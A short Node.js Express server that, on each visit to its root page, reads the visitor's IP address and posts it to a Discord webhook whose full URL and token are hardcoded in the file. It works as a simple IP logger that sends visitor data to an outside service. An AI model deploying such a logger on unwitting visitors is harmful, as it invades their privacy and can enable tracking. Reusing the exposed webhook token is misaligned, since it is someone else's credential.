const express = require('express');
const request = require('request');
const app = express();

app.get('/', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const webhookURL = 'https://discord.com/api/webhooks/1200050233137176637/WnVdN8tHACTYqZMN4WY4UH4Hagvxy3dXwBl5q3EsG9AnlW1AQiIgXCcwpKV0mutQRoNY';

  const data = {
    username: 'Website',
    content: `User's IP address: ${ip}`
  };

  request.post({
    url: webhookURL,
    json: data
  }, (err, httpResponse, body) => {
    if (err) {
      return console.error('Error sending webhook:', err);
    }
    console.log('Webhook sent successfully.');
    res.send('Webhook sent.');
  });
});

app.listen(3000, () => {
  console.log('Server listening on port 3000.');
});
